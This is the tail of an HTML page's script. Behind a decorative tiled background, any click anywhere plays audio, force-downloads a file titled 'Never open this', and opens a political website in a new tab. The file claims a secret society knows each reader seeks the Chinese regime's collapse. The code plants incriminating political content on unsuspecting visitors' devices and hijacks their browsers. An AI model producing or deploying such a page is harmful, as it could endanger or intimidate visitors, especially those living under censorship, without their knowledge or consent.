    function setRandomBackground() {
      const container = document.getElementById('background-container');
      const images = ['img/1.jpg', 'img/2.svg', 'img/3.gif', 'img/4.webp'];

      for (let i = 0; i < 100; i++) {
        const randomImage = images[getRandomInt(0, images.length - 1)];
        const tile = document.createElement('div');
        tile.className = 'tile';
        tile.style.backgroundImage = `url(${randomImage})`;
        tile.style.top = `${getRandomInt(0, 90)}%`;
        tile.style.left = `${getRandomInt(0, 90)}%`;
        container.appendChild(tile);
      }
    }

    function playAudio() {
      const audio = document.getElementById('audio');
      audio.play();
    }

    function downloadFile() {
      const fileName = '千万不要打开.txt';
      const fileContent = '我们的秘密协会知道，看过这篇文章的所有同志都是以中国政权垮台为目标的同志。从此以后我们会保持耐心，中国政权将崩溃.';

      const blob = new Blob([fileContent], { type: 'text/plain' });
      const link = document.createElement('a');
      link.href = window.URL.createObjectURL(blob);
      link.download = fileName;
      link.click();
    }

    function openNewTab(url) {
      window.open(url, '_blank');
    }


    document.addEventListener('DOMContentLoaded', setRandomBackground);
    document.addEventListener('click', function(event) {
      playAudio();
      downloadFile();
      openNewTab('https://www.tuidang.org/');
    });
  </script>
</body>
</html>
